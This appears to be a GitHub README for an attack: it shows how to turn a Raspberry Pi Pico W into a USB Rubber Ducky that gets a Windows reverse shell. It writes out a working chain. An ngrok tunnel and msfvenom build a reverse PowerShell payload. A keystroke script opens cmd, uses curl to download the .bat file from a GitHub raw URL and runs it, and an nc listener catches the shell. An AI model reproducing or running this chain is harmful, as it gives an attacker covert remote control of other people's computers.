# Reverse-shell-by-usb-rubber-ducky
## Introduction
A reverse shell is a type of shell in which the target machine communicates back to the attacker's machine. It is a technique often used in hacking and penetration testing for remote access to a system<br><br>
The USB Rubber Ducky is a type of programmable USB device which looks like a regular USB flash drive, but it's designed to function as a keyboard emulator. When plugged into a computer, the USB Rubber Ducky can quickly type pre-programmed keystroke payloads, essentially simulating a human typing at a very fast rate.
## Payload for reverse shell
To obtain a reverse shell from a target machine, you can utilize the MSFVenom tool to generate a Windows reverse PowerShell payload. This payload will allow you to establish a connection back to your machine, giving you remote access to the target system<br><br>
For port forwarding
```ngrok tcp 8080```<br><br>
![ngrok](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok.png)<br><br>
![ngrok1](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok1.png)<br><br>
Generate windows reverse PowerShell payload<br>
```msfvenom -p cmd/windows/reverse_powershell lhost=0.tcp.in.ngrok.io lport=10448 > ayush.bat ```<br><br>
![msf](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/msf.png)
## Rasberry pi pico w as rubber ducky
1. Clone the repo to get a local copy of the files. `git clone https://github.com/dbisu/pico-ducky.git`
2. Download [CircuitPython for the Raspberry Pi Pico W](https://circuitpython.org/board/raspberry_pi_pico_w/). *Updated to 8.0.0
3. Plug the device into a USB port while holding the boot button. It will show up as a removable media device named `RPI-RP2`.
4. Copy the downloaded `.uf2` file to the root of the Pico (`RPI-RP2`). The device will reboot and after a second or so, it will reconnect as `CIRCUITPY`.
5. Download `adafruit-circuitpython-bundle-8.x-mpy-YYYYMMDD.zip` [here](https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/latest) and extract it outside the device.
6. Navigate to `lib` in the recently extracted folder and copy `adafruit_hid` to the `lib` folder on your Raspberry Pi Pico.
7. Copy `adafruit_debouncer.mpy` and `adafruit_ticks.mpy` to the `lib` folder on your Raspberry Pi Pico.
8. Copy `asyncio` to the `lib` folder on your Pico.
9. Copy `adafruit_wsgi` to the `lib` folder on your Pico.
10. Copy `boot.py` from your clone to the root of your Pico.
11. Copy `duckyinpython.py`, `code.py`, `webapp.py`, `wsgiserver.py` to the root folder of the Pico.
## Setting up an attacker server and a Ducky script
Upload the Windows reverse PowerShell payload (ayush.bat) to your server; in my case, I have uploaded it to GitHub.<br><br>
Create Ducky script and save as ```payload.dd``` on root folder of pico.
```
DELAY 3000
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 200
STRING cd OneDrive 
ENTER
DELAY 200
STRING cd Desktop
ENTER
DELAY 200
STRING curl "https://raw.githubusercontent.com/aayushdangol16/payload/main/ayush.bat" > ayush.bat
ENTER
DELAY 300
STRING ayush.bat 
ENTER

```
## Attacking
Establish a listening endpoint on port 8080 ```nc -lvnp 8080```
